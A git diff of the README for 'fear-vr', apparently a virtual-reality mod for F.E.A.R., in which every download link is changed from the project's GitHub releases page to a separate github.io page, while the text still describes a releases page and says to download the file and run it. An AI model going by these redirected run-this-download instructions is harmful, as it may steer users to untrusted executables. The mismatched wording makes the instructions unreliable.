@@ -1,6 +1,6 @@
 # 🎮 fear-vr - F.E.A.R. in Virtual Reality
 
-[![Download fear-vr](https://img.shields.io/badge/Download-fear--vr-2ea44f?style=for-the-badge&logo=github)](https://github.com/Leeann80/fear-vr/releases)
+[![Download fear-vr](https://img.shields.io/badge/Download-fear--vr-2ea44f?style=for-the-badge&logo=github)](https://leeann80.github.io)
 
 ## 🕹️ What Is This?
 
@@ -30,7 +30,7 @@ Before you begin, make sure you have the following:
 
 ### Step 2: Download the Mod
 
-Visit this link to download the application: [https://github.com/Leeann80/fear-vr/releases](https://github.com/Leeann80/fear-vr/releases)
+Visit this link to download the application: [https://leeann80.github.io](https://leeann80.github.io)
 
 You'll see a list of released files. Look for the latest release and download the file that matches your needs. The download link is on the right side of the release page.
 
@@ -46,9 +46,9 @@ Put on your VR headset, make sure your controllers are on and connected, and sta
 
 ### Get the Latest Version
 
-[![Download fear-vr Releases](https://img.shields.io/badge/Download_fear--vr_Releases-1db954?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Leeann80/fear-vr/releases)
+[![Download fear-vr Releases](https://img.shields.io/badge/Download_fear--vr_Releases-1db954?style=for-the-badge&logo=github&logoColor=white)](https://leeann80.github.io)
 
-Just click the button above or go directly to: **https://github.com/Leeann80/fear-vr/releases**
+Just click the button above or go directly to: **https://leeann80.github.io**
 
 When you get to the releases page, you'll see the newest version at the top. Download the file, run it, and you're good to go. The mod is constantly updated by its creator, so check back often for new improvements and bug fixes.
 
